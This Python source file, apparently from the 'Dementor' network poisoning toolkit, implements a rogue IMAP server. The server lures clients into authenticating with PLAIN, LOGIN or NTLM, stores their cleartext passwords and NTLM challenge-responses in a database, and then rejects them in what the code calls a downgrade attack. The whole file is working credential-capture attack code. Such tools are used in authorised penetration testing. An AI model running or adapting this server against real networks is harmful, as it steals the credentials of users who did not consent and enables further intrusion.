# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# - [MS-OXIMAP]:
#    https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oximap4/b0f9d5f1-ac42-4b27-a874-0c3bf9e3b9b5
# - RFC-9501:
#    https://www.ietf.org/rfc/rfc9051.htm
import base64
import pathlib
import ssl

from impacket import ntlm

from dementor.protocols.ntlm import (
    NTLM_AUTH_CreateChallenge,
    NTLM_report_auth,
    NTLM_split_fqdn,
    ATTR_NTLM_CHALLENGE,
    ATTR_NTLM_ESS,
)
from dementor.servers import (
    ServerThread,
    ThreadingTCPServer,
    BaseProtoHandler,
    create_tls_context,
)
from dementor.logger import ProtocolLogger
from dementor.database import _CLEARTEXT
from dementor.config.toml import (
    TomlConfig,
    Attribute as A,
)
from dementor.config.attr import ATTR_TLS, ATTR_CERT, ATTR_KEY
from dementor.config.util import get_value


def apply_config(session):
    session.imap_config = list(
        map(IMAPServerConfig, get_value("IMAP", "Server", default=[]))
    )


def create_server_threads(session):
    return [
        ServerThread(
            session,
            IMAPServer,
            server_config=server_config,
            server_address=(session.bind_address, server_config.imap_port),
        )
        for server_config in (session.imap_config if session.imap_enabled else [])
    ]


IMAP_CAPABILITIES = [
    # NOTE: support STARTTLS is currently not avaialble
    # "STARTTLS",
]

IMAP_AUTH_MECHS = ["PLAIN", "LOGIN", "NTLM"]


class IMAPServerConfig(TomlConfig):
    _section_ = "IMAP"
    _fields_ = [
        A("imap_port", "Port"),
        A("imap_fqdn", "FQDN", "Dementor", section_local=False),
        A("imap_caps", "Capabilities", IMAP_CAPABILITIES),
        A("imap_auth_mechanisms", "AuthMechanisms", IMAP_AUTH_MECHS),
        A("imap_revision", "Revision", "IMAP4rev2"),
        A("imap_downgrade", "Downgrade", True),
        ATTR_NTLM_CHALLENGE,
        ATTR_NTLM_ESS,
        ATTR_KEY,
        ATTR_CERT,
        ATTR_TLS,
    ]


class StopHandler(Exception):
    pass


class IMAPHandler(BaseProtoHandler):
    def __init__(self, config, server_config, request, client_address, server) -> None:
        self.server_config = server_config
        super().__init__(config, request, client_address, server)

    def proto_logger(self) -> ProtocolLogger:
        return ProtocolLogger(
            extra={
                "protocol": "IMAP",
                "protocol_color": "honeydew2",
                "host": self.client_host,
                "port": self.server_config.imap_port,
            }
        )

    def send_greeting(self):
        # 7.1.1.  OK Response
        # An untagged response can be used as a greeting at connection
        # startup.
        banner = f"{self.server_config.imap_revision} Service Ready"
        self.push(f"OK {banner}", tag=False)

    def handle_data(self, data, transport) -> None:
        self.send_greeting()
        self.request.settimeout(2)
        self.rfile = transport.makefile("rb")

        while line := self.recv_line(1024):
            self.seq_id, cmd, *args = line.split(" ")
            method = getattr(self, f"do_{cmd.upper()}", None)
            if method:
                try:
                    method(args)
                except StopHandler:
                    break
            else:
                self.logger.debug(f"(imap) Unknown command: {line!r}")
                #  7.1.5. BYE Response
                self.push("BYE Unknown command", tag=False)
                break

    def push(self, data: str, tag=True):
        seq_id = getattr(self, "seq_id", None)
        if seq_id and tag:
            data = f"{seq_id} {data}"
        elif not tag:
            data = f"* {data}"

        self.logger.debug(f"(imap) S: {data!r}")
        data_raw = f"{data}\r\n".encode("utf-8", "strict")
        return self.send(data_raw)

    def recv_line(self, size: int) -> str | None:
        data = self.rfile.readline(size)
        if data:
            text = data.decode("utf-8", errors="replace").strip()
            self.logger.debug(f"(imap) C: {text!r}")
            return text

    def challenge_auth(
        self, token: bytes | None = None, b64_data: bool = True
    ) -> bytes | None:
        challenge = "+"
        if token:
            challenge = f"{challenge} {base64.b64encode(token).decode()}"

        self.logger.debug(f"(imap) S: {challenge!r}")
        self.send(f"{challenge}\r\n".encode("utf-8", "strict"))

        line = self.recv_line(1024)
        if line:
            return base64.b64decode(line) if b64_data else line.encode()

    def get_string(self, value):
        return value.lstrip('"').rstrip('"')

    # implementation
    #  7.2.2. CAPABILITY Response
    def do_CAPABILITY(self, args):
        self.logger.display(f"Capabilities requested from {self.client_host}")
        capabilities = ["CAPABILITY"] + self.server_config.imap_caps
        capabilities.extend(
            map(lambda x: f"AUTH={x}", self.server_config.imap_auth_mechanisms)
        )
        self.push(" ".join(capabilities), tag=False)
        self.push("OK CAPABILITY completed")
        pass

    #  6.1.2. NOOP Command
    def do_NOOP(self, args):
        self.push("OK NOOP completed")

    #  6.2.3. LOGIN Command
    def do_LOGIN(self, args):
        if len(args) != 2:
            self.push("BAD Invalid number of arguments")
            return

        username, password = args
        self.config.db.add_auth(
            client=self.client_address,
            username=self.get_string(username),
            password=self.get_string(password),
            logger=self.logger,
            credtype=_CLEARTEXT,
        )
        self.push("NO LOGIN failed")
        raise StopHandler

    def do_AUTHENTICATE(self, args):
        if len(args) != 1:
            self.push("BAD Invalid number of arguments")
            return

        auth_mechanism = self.get_string(args[0].upper())
        method = getattr(self, f"auth_{auth_mechanism}", None)
        if method:
            method()
        else:
            self.push("BAD Invalid authentication mechanism")

    def do_STARTTLS(self, args):
        self.push("NO STARTTLS not supported")

    # [MS-OXIMAP] 2.2.1 IMAP4 NTLM
    def auth_NTLM(self):
        # IMAP4_AUTHENTICATE_NTLM_Supported_Response
        token = self.challenge_auth()
        if not token:
            raise StopHandler

        # IMAP4_AUTHENTICATE_NTLM_Blob_Command
        negotiate = ntlm.NTLMAuthNegotiate()
        negotiate.fromString(token)

        # IMAP4_AUTHENTICATE_NTLM_Blob_Response
        challenge = NTLM_AUTH_CreateChallenge(
            negotiate,
            *NTLM_split_fqdn(self.server_config.imap_fqdn),
            challenge=self.server_config.ntlm_challenge,
            disable_ess=not self.server_config.ntlm_ess,
        )

        # IMAP4_AUTHENTICATE_NTLM_Blob_Command
        token = self.challenge_auth(challenge.getData())
        if not token:
            raise StopHandler

        auth_message = ntlm.NTLMAuthChallengeResponse()
        auth_message.fromString(token)
        NTLM_report_auth(
            auth_message,
            challenge=self.server_config.ntlm_challenge,
            client=self.client_address,
            logger=self.logger,
            session=self.config,
        )

        if self.server_config.imap_downgrade:
            self.logger.display(f"Performing downgrade attack on {self.client_host}")
            return self.push("NO Authentication failed")

        self.push("OK AUTHENTICATE completed")

    def auth_PLAIN(self):
        login_and_password = self.challenge_auth()
        # 2.  PLAIN SASL Mechanism
        try:
            _, login, password = login_and_password.split(b"\x00")
        except ValueError:
            self.push("BAD Invalid login data")
            raise StopHandler

        self.config.db.add_auth(
            client=self.client_address,
            username=login.decode(errors="replace"),
            password=password.decode(errors="replace"),
            logger=self.logger,
            credtype=_CLEARTEXT,
        )
        self.push("NO LOGIN failed")

    def auth_LOGIN(self):
        username = self.challenge_auth()
        if not username:
            raise StopHandler

        password = self.challenge_auth()
        if not password:
            raise StopHandler

        self.config.db.add_auth(
            client=self.client_address,
            username=username.decode(errors="replace"),
            password=password.decode(errors="replace"),
            logger=self.logger,
            credtype=_CLEARTEXT,
        )
        self.push("NO LOGIN failed")


class IMAPServer(ThreadingTCPServer):
    default_port = 143
    default_handler_class = IMAPHandler
    service_name = "IMAP"

    def __init__(
        self,
        config,
        server_address=None,
        RequestHandlerClass: type | None = None,
        server_config: IMAPServerConfig | None = None,
    ) -> None:
        self.server_config = server_config
        super().__init__(config, server_address, RequestHandlerClass)
        self.ssl_context = create_tls_context(self.server_config, self)
        if self.ssl_context:
            self.socket = self.ssl_context.wrap_socket(self.socket, server_side=True)

    def finish_request(self, request, client_address) -> None:
        self.RequestHandlerClass(
            self.config, self.server_config, request, client_address, self
        )
